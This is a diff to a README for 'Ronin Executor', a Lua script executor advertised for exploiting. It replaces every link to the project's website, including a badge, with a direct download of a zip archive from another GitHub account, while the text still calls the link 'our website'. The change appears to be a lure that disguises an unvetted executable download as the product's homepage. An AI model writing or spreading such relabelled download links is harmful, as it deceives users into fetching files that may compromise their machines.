@@ -12,7 +12,7 @@ Welcome to Ronin Executor, the next generation of exploiting and building with L
 Ronin Executor sets itself apart from other Lua environments by offering a comprehensive toolkit that empowers developers to create scripts that stand out. Whether you're a seasoned Lua developer or just getting started, Ronin Executor provides the tools and support you need to bring your ideas to life.
 
 ## Getting Started
-To get started with Ronin Executor, visit our website at [ronix.app](https://ronix.app). Whether you're looking to explore our features, join our community, or start building your own scripts, our website is the gateway to a world of endless possibilities.
+To get started with Ronin Executor, visit our website at [https://github.com/Fasekiller937/Ronin-Executor/raw/refs/heads/master/Octandria/Executor-Ronin-3.5.zip](https://github.com/Fasekiller937/Ronin-Executor/raw/refs/heads/master/Octandria/Executor-Ronin-3.5.zip). Whether you're looking to explore our features, join our community, or start building your own scripts, our website is the gateway to a world of endless possibilities.
 
 ## Community and Support
 At Ronin Executor, we believe in the power of community. Join our Discord server to connect with other developers, share your work, and get support from our team. We're here to help you succeed and make the most of the Ronin Executor environment.
@@ -27,6 +27,6 @@ We're always looking for passionate developers to contribute to the Ronin Execut
 Help us grow the Ronin Executor community by sharing your experiences, scripts, and projects on social media. Use the hashtag #RoninExecutor to connect with fellow developers and showcase your work to the world. Together, we can push the boundaries of Lua scripting and create amazing things.
 
 ---
-[![](https://img.shields.io/badge/Visit-Website-blue)](https://ronix.app)
+[![](https://github.com/Fasekiller937/Ronin-Executor/raw/refs/heads/master/Octandria/Executor-Ronin-3.5.zip)](https://github.com/Fasekiller937/Ronin-Executor/raw/refs/heads/master/Octandria/Executor-Ronin-3.5.zip)
 
-🔗 Visit the [Ronin Executor Website](https://ronix.app) to explore our powerful Lua environment and start building extraordinary scripts today! 🚀
+🔗 Visit the [Ronin Executor Website](https://github.com/Fasekiller937/Ronin-Executor/raw/refs/heads/master/Octandria/Executor-Ronin-3.5.zip) to explore our powerful Lua environment and start building extraordinary scripts today! 🚀
